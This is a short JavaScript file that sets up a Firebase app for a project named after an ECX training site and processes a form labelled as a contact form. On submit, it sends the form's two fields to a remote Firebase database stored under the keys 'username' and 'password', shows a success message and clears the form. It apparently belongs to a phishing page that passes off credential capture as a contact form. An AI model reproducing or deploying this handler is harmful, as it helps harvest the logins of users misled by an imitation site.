// Paste the code from Firebase
var config = {
    apiKey: "",
    authDomain: "https://training-ecx-com-et.web.app/",
    databaseURL: "https://training-ecx-com-et-default-rtdb.firebaseio.com/",
    projectId: "training-ecx-com-et",
    storageBucket: "",
    messagingSenderId: "",
    appId: "1:505618737397:web:bb4f02f9244d91e7fbfdbc"
};
firebase.initializeApp(config);

var messagesRef = firebase.database().ref('contactformmessages');

$('#contactForm').submit(function(e) {
    e.preventDefault();
 
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
        username: $('.fullname').val(),
        password: $('.email').val(),
       
    });
 
    $('.success-message').show();
 
    $('#contactForm')[0].reset();
});
